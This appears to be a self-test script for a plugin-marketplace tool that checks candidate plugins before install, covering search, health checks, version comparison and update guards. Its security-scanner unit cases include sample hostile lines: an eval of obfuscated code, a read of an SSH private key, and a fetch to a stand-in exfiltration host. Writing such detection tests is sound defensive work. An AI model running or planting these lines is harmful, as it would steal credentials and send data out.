/**
 * find_plugin 装前体检 — 真实端到端自检。
 *
 * 直接加载构建产物 lib/index.js(和线上 dsh 跑的是同一份代码),挂一个"真
 * 实"的 subprocess 面(curl/powershell/git 都走真正的 child_process,与
 * 生产环境完全一致),对真实 GitHub 和本机真实 profile 跑一遍:
 *   1. 真实搜索 + 前 5 个候选的装前体检;
 *   2. 输出形状校验(无 undefined、health 字段齐全);
 *   3. render 文本;
 *   4. 正/反例:本仓库应 ok,不存在的仓库应 error。
 *
 * 运行前脚本会把构建产物 lib/ 复制进 profile 的共享 store(临时目录
 * .zat-selftest,退出时自动清理),让 @deepseek-ai/* 依赖按生产环境解析;
 * 仓库 node_modules 不被触碰。
 * 用法: node scripts/selftest-find-health.mjs ["查询词"] [limit]
 */
import { mkdirSync, rmSync, cpSync } from 'node:fs'
import { spawn as nodeSpawn, spawnSync } from 'node:child_process'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const repo = dirname(dirname(fileURLToPath(import.meta.url)))
const home = process.env.DSH_HOME || join(process.env.HOME || process.env.USERPROFILE || 'C:/Users', '.dsh')
const store = join(home, 'profiles', 'node_modules')

// ── 1. 把构建产物复制进 profile store 再 import:ESM 按文件真实路径解析
//    依赖,只有让 index.js 本身位于 store 里,它的 @deepseek-ai/* 才会按
//    生产环境解析(仓库 node_modules 不被触碰,退出时自动清理)。 ──
const selftestDir = join(store, '.zat-selftest')
rmSync(selftestDir, { recursive: true, force: true })
mkdirSync(selftestDir, { recursive: true })
cpSync(join(repo, 'lib'), join(selftestDir, 'lib'), { recursive: true })
process.on('exit', () => { try { rmSync(selftestDir, { recursive: true, force: true }) } catch { /* best effort */ } })

// ── 2. 真实的 subprocess 面(与 dsh 的 subprocess 服务同语义) ─────────────
async function resolveExecutable(name) {
  const r = spawnSync('where.exe', [name], { encoding: 'utf8', timeout: 10000, windowsHide: true })
  if (r.status === 0 && r.stdout.trim()) return r.stdout.trim().split(/\r?\n/)[0].trim()
  throw new Error(`executable not found: ${name}`)
}

function spawn({ argv, cwd, stdio, graceMs }) {
  const cp = nodeSpawn(argv[0], argv.slice(1), {
    cwd: cwd || 'C:\\',
    stdio: ['pipe', 'pipe', 'pipe'],
    windowsHide: true,
  })
  const maxOut = (stdio && stdio.stdout && stdio.stdout.maxBytes) || 16 * 1024 * 1024
  const maxErr = (stdio && stdio.stderr && stdio.stderr.maxBytes) || 1024 * 1024
  const chunks = { stdout: [], stderr: [] }
  let outSize = 0
  let errSize = 0
  cp.stdout.on('data', (d) => { if (outSize < maxOut) { chunks.stdout.push(d); outSize += d.length } })
  cp.stderr.on('data', (d) => { if (errSize < maxErr) { chunks.stderr.push(d); errSize += d.length } })
  const done = new Promise((resolve) => {
    const timer = setTimeout(() => { try { cp.kill() } catch { /* gone */ } }, graceMs || 60000)
    cp.on('close', (code) => { clearTimeout(timer); resolve({ exitCode: code === null ? 1 : code }) })
    cp.on('error', () => { clearTimeout(timer); resolve({ exitCode: 1 }) })
  })
  if (stdio && stdio.stdin && typeof stdio.stdin.data === 'string') {
    cp.stdin.write(stdio.stdin.data)
  }
  cp.stdin.end()
  const text = (arr) => Buffer.concat(arr).toString('utf8')
  return { done, collected: { stdout: { readFrom: () => ({ text: text(chunks.stdout) }) }, stderr: { readFrom: () => ({ text: text(chunks.stderr) }) } } }
}

const fakeSubprocess = { resolveExecutable, spawn }

// ── 3. 最小 Cordis 上下文:注册工具时把定义抓出来,后面直接调真实 execute ──
let toolDef = null
const fakeTools = { register(def) { toolDef = def; return () => {} } }
const fakeCtx = {
  get(name) {
    if (name === 'subprocess') return fakeSubprocess
    if (name === 'tools') return fakeTools
    return undefined
  },
  reflect: { provide() { /* self-test: 不真注册 */ } },
  effect(callback) {
    let dispose = null
    try { dispose = callback() } catch { /* tool 注册失败在下面由 toolDef 判空兜底 */ }
    return () => { if (typeof dispose === 'function') dispose() }
  },
  baseUrl: join(home, 'profiles', 'web'),
}

const { ZatMarketGateway, scanSecurity, compareVersions, fieldSupports } = await import(pathToFileURL(join(selftestDir, 'lib', 'index.js')).href)
const gw = new ZatMarketGateway(fakeCtx)
if (!toolDef) throw new Error('tools.register 没有被调用 —— find_plugin 工具注册失败')

// ── 4. 断言工具 ────────────────────────────────────────────────────────────
const failures = []
function assert(cond, label) {
  if (cond) console.log(`  ✔ ${label}`)
  else { failures.push(label); console.error(`  ✘ ${label}`) }
}
function findUndefined(node, path) {
  const hits = []
  if (node === undefined) return [path]
  if (node === null || typeof node !== 'object') return hits
  for (const [k, v] of Object.entries(node)) {
    if (v === undefined) hits.push(`${path}.${k}`)
    else hits.push(...findUndefined(v, `${path}.${k}`))
  }
  return hits
}

// ── 5. 安全扫描单元用例 + 正/反例 ────────────────────────────────────────
console.log('\n== 安全扫描单元用例 ==')
const secCases = [
  ['eval(doEvil())', true, /混淆/],
  ["readFileSync('~/.ssh/id_rsa')", true, /凭据/],
  ["fetch('https://evil-paste.xyz/save')", true, /可疑网络去向/],
  ["fetch('https://api.deepseek.com/v1/chat')", false, null],
  ["fetch('https://vision-provider.example.com/ocr')", true, /外部服务/],
  ["fetch('http://your-mineru-host:8000/parse')", true, /占位/],
  ["fetch('http://x/api')", true, /占位/],
]
for (const [code, expectFinding, pattern] of secCases) {
  const hits = scanSecurity(String(code), '代码')
  const matched = expectFinding ? hits.some((f) => !pattern || pattern.test(f.title)) : hits.length === 0
  console.log(`  ${String(code).slice(0, 60)} -> ${hits.map((f) => `${f.level}:${f.title}`).join(' | ') || '(无发现)'}`)
  assert(matched, `安全用例: ${String(code).slice(0, 40)}`)
}

console.log('\n== 安装拦截:入口文件缺失(DSH-better-sidebar)==')
const conf = await gw.analyzeCandidateConflicts('omdsh-dev', 'DSH-better-sidebar')
console.log(`  block: ${conf.block.join(' | ') || '(无)'}`)
assert(conf.block.some((b) => b.includes('入口文件缺失')), 'DSH-better-sidebar 被安装门拦截(入口文件缺失)')

console.log('\n== 反例:不存在的仓库(期望 status=error)==')
const neg = await gw.analyzeCandidateHealth('mishibeikejie', 'zat-dsh-engine-does-not-exist-xyz', 'plugin')
console.log(`  status=${neg.status} summary=${neg.summary}`)
for (const c of neg.checks) console.log(`    [${c.level}] ${c.title}`)
assert(neg.status === 'error', '不存在的仓库 → error(读不到 package.json)')

console.log('\n== 正例:本仓库自身(期望 status=ok)==')
const pos = await gw.analyzeCandidateHealth('mishibeikejie', 'zat-dsh-engine', 'plugin')
console.log(`  status=${pos.status} summary=${pos.summary}`)
for (const c of pos.checks) console.log(`    [${c.level}] ${c.title} — ${c.detail}`)
assert(pos.status === 'ok', '本仓库 → ok(入口/补丁/依赖全部正常)')

console.log('\n== 真实案例:liustack/modlens(宿主代码引用未提交的 dist 引擎,期望 error)==')
const mod = await gw.analyzeCandidateHealth('liustack', 'modlens', 'plugin')
console.log(`  status=${mod.status} summary=${mod.summary}`)
for (const c of mod.checks) console.log(`    [${c.level}] ${c.title} — ${c.detail.slice(0, 100)}`)
assert(mod.status === 'error', 'modlens → error(dist 引擎缺失)')
assert(mod.checks.some((c) => c.level === 'error' && /仓库里不存在/.test(c.title) && /dist/i.test(c.title)), 'modlens: 检出缺失的 dist 引擎文件')
assert(mod.checks.some((c) => c.level === 'warn' && c.title.includes('配置文件')), 'modlens: 检出用户目录配置依赖')

console.log('\n== 放宽搜索探针(topic 为空时自动全文兜底,信息展示)==')
const probe = await toolDef.execute({ query: 'UI设计界面', limit: 3 })
console.log(`  notice: ${probe.notice}`)
for (const it of probe.items) console.log(`  - ${it.fullName} ★${it.stars} [${it.kind}] installable=${it.installable} health=${it.health.status}`)

console.log('\n== 一键检测(对本机真实 profile 的已装插件跑安全扫描)==')
const hc = await gw.healthCheck()
console.log(`  ok=${hc.ok} issues=${Array.isArray(hc.issues) ? hc.issues.length : 'n/a'}`)
for (const it of (hc.issues || []).slice(0, 30)) console.log(`  [${it.level}] ${it.title} — ${String(it.detail || '').slice(0, 80)}`)
assert(hc.ok === true, 'healthCheck 正常返回 ok:true')

console.log('\n== 自更新防降级/防覆盖(本机 profile 是 link 安装)==')
assert(compareVersions('0.4.3', '0.4.2') === 1, 'compareVersions: 0.4.3 > 0.4.2')
assert(compareVersions('0.4.2', '0.4.3') === -1, 'compareVersions: 0.4.2 < 0.4.3')
assert(compareVersions('v1.2.3', '1.2.3') === 0, 'compareVersions: v 前缀不影响')
assert(compareVersions('1.10.0', '1.9.9') === 1, 'compareVersions: 按数字比,不是按字符串比')
assert(gw.mirrorSpecFor('github:a/b') === 'https://gh-proxy.com/https://github.com/a/b.git', 'mirrorSpecFor: 基本转换')
assert(gw.mirrorSpecFor('github:a/b#path:c/d') === 'https://gh-proxy.com/https://github.com/a/b.git#path:c/d', 'mirrorSpecFor: 保留子目录')

console.log('\n== 系统兼容检查(fieldSupports + osMap)==')
assert(fieldSupports(['win32', 'darwin'], 'win32') === true, 'fieldSupports: 白名单命中')
assert(fieldSupports(['linux', 'darwin'], 'win32') === false, 'fieldSupports: 白名单不支持 win32')
assert(fieldSupports(['!win32'], 'linux') === true, 'fieldSupports: 黑名单放行 linux')
assert(fieldSupports(['!win32'], 'win32') === false, 'fieldSupports: 黑名单拦截 win32')
assert(fieldSupports(undefined, 'win32') === true, 'fieldSupports: 未声明=跨平台')
assert(fieldSupports([], 'win32') === true, 'fieldSupports: 空数组=跨平台')
const osm = await gw.osMap(['mishibeikejie/zat-dsh-engine'])
const osmEntry = osm.map && osm.map['mishibeikejie/zat-dsh-engine']
console.log(`  osMap: ${osmEntry ? `os=[${osmEntry.os}] cpu=[${osmEntry.cpu}]` : '(无)'}`)
assert(osm.ok === true && osmEntry && Array.isArray(osmEntry.os), 'osMap 返回本仓库的 os/cpu')

console.log('\n== 分类搜索不 422 ==')
const catList = await gw.list(1, 'stars', '', '皮肤 / 主题')
console.log(`  list(皮肤/主题): ok=${catList.ok} items=${(catList.items || []).length}`)
assert(catList.ok === true && Array.isArray(catList.items), '分类搜索不再报 422')
const su = await gw.selfupdate(false)
console.log(`  selfupdate(false): hasUpdate=${su.hasUpdate} devLink=${su.devLink} message=${su.message}`)
assert(su.hasUpdate === false, 'link 安装下不提示更新(本地 0.4.3 领先 GitHub 0.4.2,不提示降级)')
assert(su.devLink === true, 'link 安装被识别为开发版')
const suDo = await gw.selfupdate(true)
console.log(`  selfupdate(true): ok=${suDo.ok} message=${suDo.message}`)
assert(suDo.ok === false, 'link 安装下 selfupdate(true) 拒绝覆盖本地代码')

// ── 6. 真实搜索 + 体检 + 输出形状 ─────────────────────────────────────────
const query = process.argv[2] || '视觉 图片识别 OCR'
const limit = Number(process.argv[3]) || 5
console.log(`\n== 真实搜索:"${query}" limit=${limit} ==`)
const started = Date.now()
const result = await toolDef.execute({ query, limit })
console.log(`  用时 ${((Date.now() - started) / 1000).toFixed(1)}s`)
console.log(`  notice: ${result.notice}`)
for (const it of result.items) {
  const h = it.health
  console.log(`  - ${it.fullName} ★${it.stars} [${it.kind}] installable=${it.installable} health=${h.status} | ${h.summary}`)
  for (const c of h.checks) console.log(`      [${c.level}] ${c.title} — ${c.detail.slice(0, 90)}`)
}
assert(Array.isArray(result.items) && result.items.length > 0, '搜索返回了候选')
assert(typeof result.notice === 'string' && result.notice.length > 0, 'notice 非空')
const undef = findUndefined(result, 'result')
assert(undef.length === 0, `结果树无 undefined 字段(${undef.length} 处)`)
for (const it of result.items) {
  const h = it.health
  assert(h && ['ok', 'warn', 'error', 'unknown', 'skip'].includes(h.status), `${it.fullName}: health.status 合法(${h && h.status})`)
  assert(h && typeof h.summary === 'string' && h.summary.length > 0, `${it.fullName}: health.summary 非空`)
  assert(h && Array.isArray(h.checks), `${it.fullName}: health.checks 是数组`)
  for (const c of (h && h.checks) || []) {
    assert(['error', 'warn'].includes(c.level) && typeof c.title === 'string' && typeof c.detail === 'string', `${it.fullName}: 检查条目字段齐全`)
  }
}

console.log('\n== render 输出预览 ==')
const rendered = toolDef.output.render({}, result)
for (const block of rendered) {
  if (block.type === 'text') console.log(block.text.split('\n').slice(0, 40).join('\n'))
}

// ── 7. 独立复核:凡报"入口文件缺失"的,用另一条路重新验证 ───────────────────
console.log('\n== 独立复核(用 node fetch 重新拉 package.json 对照入口)==')
for (const it of result.items) {
  const missing = it.health.checks.filter((c) => c.level === 'error' && c.title.includes('入口文件缺失'))
  if (missing.length === 0) continue
  const pkgUrl = `https://raw.githubusercontent.com/${it.fullName}/HEAD/package.json`
  try {
    const res = await fetch(pkgUrl)
    if (!res.ok) { console.log(`  ${it.fullName}: 复核无法拉取 package.json (${res.status})`); continue }
    const meta = await res.json()
    const entries = [meta.main].filter(Boolean)
    for (const v of Object.values(meta.exports || {})) {
      if (typeof v === 'string') entries.push(v)
      else if (v && typeof v === 'object' && typeof v.default === 'string') entries.push(v.default)
    }
    const confirmed = []
    for (const rel of [...new Set(entries)].slice(0, 2)) {
      const fr = await fetch(`https://raw.githubusercontent.com/${it.fullName}/HEAD/${rel}`)
      if (!fr.ok) confirmed.push(rel)
    }
    const claimed = missing[0].title
    console.log(`  ${it.fullName}\n    体检结论: ${claimed}\n    独立复核: 确实缺失 -> ${confirmed.join('、') || '(无,结论存疑)'}`)
    assert(confirmed.length > 0, `${it.fullName}: "入口文件缺失"结论经独立复核成立`)
  } catch (err) {
    console.log(`  ${it.fullName}: 复核异常 ${err.message}`)
  }
}

// ── 8. 缓存:再跑一次同一查询,health 结果应保持一致 ────────────────────────
console.log('\n== 二次调用(走缓存)==')
const again = await toolDef.execute({ query, limit: Math.min(limit, 5) })
for (const it of again.items) {
  const first = result.items.find((x) => x.fullName === it.fullName)
  if (!first || first.health.status === 'unknown') continue // unknown 不缓存,允许重试后变化
  const same = first && JSON.stringify(first.health) === JSON.stringify(it.health)
  console.log(`  ${it.fullName}: ${same ? '与首次一致(缓存命中)' : '不一致(注意!)'}`)
  assert(same !== false, `${it.fullName}: 二次结果与首次一致`)
}

console.log(`\n${failures.length === 0 ? '全部通过 ✅' : `失败 ${failures.length} 项 ❌`}`)
if (failures.length > 0) process.exitCode = 1
